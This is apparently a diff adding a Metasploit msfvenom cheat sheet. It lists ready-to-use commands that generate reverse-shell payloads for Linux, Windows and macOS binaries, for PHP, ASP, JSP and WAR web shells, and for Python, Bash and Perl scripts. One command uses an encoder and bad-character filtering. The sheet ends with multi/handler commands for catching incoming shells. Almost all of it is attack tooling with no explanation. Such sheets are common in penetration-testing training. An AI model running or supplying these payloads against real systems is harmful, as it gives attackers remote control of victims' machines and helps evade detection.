@@ -1,0 +1,68 @@
+List payloads
+-------------
+msfvenom -l
+
+Binaries
+--------
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+
+OR
+msfvenom 10.0.2.11 -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.11 LPORT=443 -f elf -o shell
+
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+OR
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+OR "Client Side Javascript Unicode Format"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none 
+
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+
+Web Payloads
+------------
+PHP
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+
+JSP
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+
+WAR
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
+Scripting Payloads
+
+Python
+
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+
+Bash
+
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+
+Perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+
+Handlers
+--------
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. 
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>   ex windows/meterpreter/reverse_tcp
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
